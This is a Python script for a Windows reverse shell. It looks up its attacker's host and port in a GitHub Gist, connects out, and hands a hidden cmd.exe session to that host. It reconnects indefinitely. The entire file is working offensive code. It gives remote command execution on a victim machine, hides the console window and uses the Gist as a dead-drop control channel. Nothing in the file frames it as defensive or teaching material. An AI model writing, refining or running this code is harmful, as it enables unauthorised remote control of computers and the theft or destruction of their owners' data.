import socket
import subprocess
import threading
import time
import os
import json
import sys
import select
from urllib.request import urlopen, Request # <--- NEW IMPORTS
from urllib.error import URLError, HTTPError # <--- NEW IMPORTS

# --- Configuration ---
# GIST ID is static. The script uses this to find your dynamic URL.
GIST_ID = "39fa66d009773b8324cc5845a9284930"
API_URL = f"https://api.github.com/gists/{GIST_ID}"
FILE_NAME = "reverse.txt" 
RETRY_DELAY = 10 

# --- Helper Functions (Data Transfer - Unchanged) ---

def s2p(s, p):
    """Transfer data from socket to process (stdin)."""
    while True:
        try:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
            else:
                break
        except:
            break

def p2s(s, p):
    """Transfer data from process (stdout) to socket."""
    # Reads efficiently using subprocess's stdout
    while True:
        try:
            data = p.stdout.read(1)
            if data:
                s.send(data)
            else:
                break
        except:
            break

# --- Core Logic ---

def fetch_and_connect():
    global url, port
    print("\nStarting Windows Dynamic Reverse Shell...")

    while True:
        
        # 1. FETCH CONNECTION DETAILS (Using urllib.request)
        current_host = None
        current_port = None
        
        try:
            print(f"[*] Fetching GIST metadata from API...")
            
            # Request 1: Get Gist Metadata from API (No requests library needed)
            with urlopen(API_URL, timeout=10) as response:
                api_data = response.read().decode('utf-8')
            
            gist_data = json.loads(api_data)
            raw_url = gist_data['files'][FILE_NAME]['raw_url']
            
            # 2. Fetch Content (HOST:PORT)
            print(f"[*] Fetching connection details from discovered URL...")
            with urlopen(raw_url, timeout=10) as response:
                raw_content = response.read().decode('utf-8')
            
            # --- DEBUG PRINT STATEMENT ---
            print(f"[DEBUG] Raw content retrieved:\n---START---\n{raw_content.strip()}\n---END---")
            # -----------------------------
            
            # 3. Parsing Logic (handles host: and port: labels)
            lines = raw_content.splitlines()
            
            for line in lines:
                if ":" not in line: continue
                label, value = line.split(":", 1)
                label = label.strip().lower()
                value = value.strip()

                if label == "host":
                    if "://" in value:
                        value = value.split("://", 1)[1]
                    current_host = value
                elif label == "port":
                    current_port = int(value)

            if not current_host or not current_port:
                print("[-] Parsing failed. Retrying...")
                time.sleep(RETRY_DELAY)
                continue
                
            print(f"[+] Target found: {current_host}:{current_port}")

        # Handle exceptions specific to urllib (network/HTTP errors) and parsing
        except (URLError, HTTPError, ValueError, IndexError, json.JSONDecodeError, KeyError) as e:
            print(f"[-] Fetch error: {e}")
            time.sleep(RETRY_DELAY)
            continue

        # 4. CONNECT AND RUN (Windows Subprocess)
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((current_host, current_port))
            
            p = subprocess.Popen(
                ["cmd.exe"], 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            # Threads
            threading.Thread(target=s2p, args=[s, p], daemon=True).start()
            threading.Thread(target=p2s, args=[s, p], daemon=True).start()

            p.wait() # Block until shell closes

        except Exception as e:
            print(f"[-] Connection failed: {e}")

        finally:
            if s: s.close()
            print(f"[!] Reconnecting in {RETRY_DELAY}s...")
            time.sleep(RETRY_DELAY)

if __name__ == "__main__":
    fetch_and_connect()
